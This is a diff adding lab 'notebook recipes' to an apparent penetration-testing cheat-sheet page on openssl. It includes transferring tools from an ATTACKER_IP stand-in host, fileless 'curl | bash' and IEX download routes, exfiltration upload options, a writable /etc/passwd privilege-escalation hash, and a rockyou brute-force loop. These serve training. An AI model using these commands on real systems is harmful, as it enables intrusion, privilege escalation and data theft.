@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=openssl) · [All tools](/index)
+
 ## Commands
 
 **Kali**
@@ -22,8 +24,244 @@ openssl s_client -starttls smtp -connect TARGET_IP:587
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=openssl)
+## Notebook recipes
 
-## Learning and original examples
+13 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Read and Search Email with POP3 and IMAP](/enumeration/email-enumeration-manipulation-pop3-imap)
+<AccordionGroup>
+
+<Accordion title="Linux LOLBins">
+
+### Linux LOLBins
+
+**File Transfers for Linux and Windows**
+
+```bash
+# On attacker — create cert and start server
+openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
+
+# On target — download
+openssl s_client -connect <ATTACKER_IP>:80 -quiet > LinEnum.sh
+```
+
+</Accordion>
+
+<Accordion title="Linux — OpenSSL Encryption">
+
+### Linux — OpenSSL Encryption
+
+**File Transfers for Linux and Windows**
+
+```bash
+# Encrypt
+openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
+
+# Decrypt
+openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
+```
+
+</Accordion>
+
+<Accordion title="Quick Decision Tree">
+
+### Quick Decision Tree
+
+**File Transfers for Linux and Windows**
+
+```text
+DOWNLOADING TO WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest or WebClient.DownloadFile
+├── Only cmd.exe?       → certutil or bitsadmin
+├── Internal network?   → SMB (impacket-smbserver)
+├── Need fileless?      → IEX + DownloadString
+└── Nothing works?      → Base64 encode/decode via clipboard
+
+DOWNLOADING TO LINUX:
+├── Have curl/wget?     → Use them (simplest)
+├── Need fileless?      → curl | bash  or  wget -qO- | python3
+├── Have Python/PHP?    → Use language one-liners
+├── Nothing available?  → /dev/tcp bash trick
+└── Need encryption?    → OpenSSL s_server/s_client
+
+UPLOADING FROM WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest -Method PUT (to Nginx)
+├── Only cmd.exe?       → certreq.exe -Post (to netcat listener)
+├── Internal network?   → SMB or WebDAV
+└── Nothing works?      → Base64 encode → copy-paste → decode on attacker
+
+UPLOADING FROM LINUX:
+├── Have curl?          → curl -T file (to Nginx PUT) or curl -X POST (to uploadserver)
+├── Have SCP?           → scp file user@attacker:/path/
+├── Have Python?        → python3 requests.post one-liner
+└── Nothing works?      → Start python3 -m http.server on target, wget from attacker
+```
+
+</Accordion>
+
+<Accordion title="Web Upload (Python uploadserver with HTTPS)">
+
+### Web Upload (Python uploadserver with HTTPS)
+
+**File Transfers for Linux and Windows**
+
+```bash
+# On attack box — create self-signed cert and start server
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+mkdir https && cd https
+sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+```
+
+</Accordion>
+
+<Accordion title="IMAP (Port 143 / 993 SSL)">
+
+### IMAP (Port 143 / 993 SSL)
+
+**Footprinting: Service-by-Service Lab Workflow**
+
+```bash
+# Connect plaintext
+telnet <IP> 143
+
+# Connect SSL
+openssl s_client -connect <IP>:993
+
+# Commands (A1, A2 are tags — use any prefix)
+A1 LOGIN <username> <password>
+A2 LIST "" "*"                    # list all mailboxes
+A3 SELECT INBOX                   # open inbox
+A4 SEARCH ALL                     # list message IDs
+A5 FETCH 1 BODY[]                 # read full message
+A6 FETCH 1:* (FLAGS SUBJECT)     # list subjects
+A7 LOGOUT
+
+# Quick test with curl
+curl -k imaps://<IP> -u '<user>:<pass>'
+curl -k imaps://<IP>/INBOX -u '<user>:<pass>'
+```
+
+</Accordion>
+
+<Accordion title="POP3 (Port 110 / 995 SSL)">
+
+### POP3 (Port 110 / 995 SSL)
+
+**Footprinting: Service-by-Service Lab Workflow**
+
+```bash
+# Connect plaintext
+telnet <IP> 110
+
+# Connect SSL
+openssl s_client -connect <IP>:995
+
+# Commands
+USER <username>
+PASS <password>
+STAT                # number of messages
+LIST                # list messages with sizes
+RETR 1              # read message 1
+TOP 1 0             # headers only
+QUIT
+
+# Quick test with curl
+curl -k pop3s://<IP> -u '<user>:<pass>'
+```
+
+</Accordion>
+
+<Accordion title="Interesting capabilities">
+
+### Interesting capabilities
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+$ getcap openssl /usr/bin/openssl 
+openssl=ep
+```
+
+</Accordion>
+
+<Accordion title="Writable /etc/passwd">
+
+### Writable /etc/passwd
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+openssl passwd -1 -salt hacker hacker
+mkpasswd -m SHA-512 hacker
+python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
+```
+
+</Accordion>
+
+<Accordion title="OpenSSL-encrypted GZIP (.gzip that isn&#x27;t really gzip)">
+
+### OpenSSL-encrypted GZIP (.gzip that isn't really gzip)
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+file GZIP.gzip                       # -> "openssl enc'd data with salted password"
+```
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz;done
+ls    # a new extracted file appears if a password worked
+```
+
+</Accordion>
+
+<Accordion title="Connecting by hand">
+
+### Connecting by hand
+
+**Read and Search Email with POP3 and IMAP**
+
+```bash
+# Plaintext
+nc <IP> 110          # POP3
+nc <IP> 143          # IMAP
+
+# Encrypted (use these when only 993/995 are open, or to upgrade a plain port)
+openssl s_client -connect <IP>:995                    # POP3S
+openssl s_client -connect <IP>:110 -starttls pop3     # upgrade plain POP3 to TLS
+openssl s_client -connect <IP>:143 -starttls imap     # upgrade plain IMAP to TLS
+```
+
+</Accordion>
+
+<Accordion title="File Transfer Protocols">
+
+### File Transfer Protocols
+
+**Ports, Protocols, and Services by Purpose**
+
+Context from the notebook: FTPS 990 FTP over TLS openssl s_client -connect &lt;IP>:21 -starttls ftp
+
+```text
+openssl s_client -connect <IP>:21 -starttls ftp
+```
+
+</Accordion>
+
+<Accordion title="Signature moves &amp; deep dive">
+
+### Signature moves & deep dive
+
+**Ports, Protocols, and Services by Purpose**
+
+Context from the notebook: Read mail over TLS:   openssl s_client -connect &lt;IP>:993  (IMAP) or  :995  (POP3); or  curl -k 'imaps://&lt;IP>' --user &lt;user>:&lt;pass>
+
+```text
+openssl s_client -connect <IP>:993
+```
+
+</Accordion>
+
+</AccordionGroup>
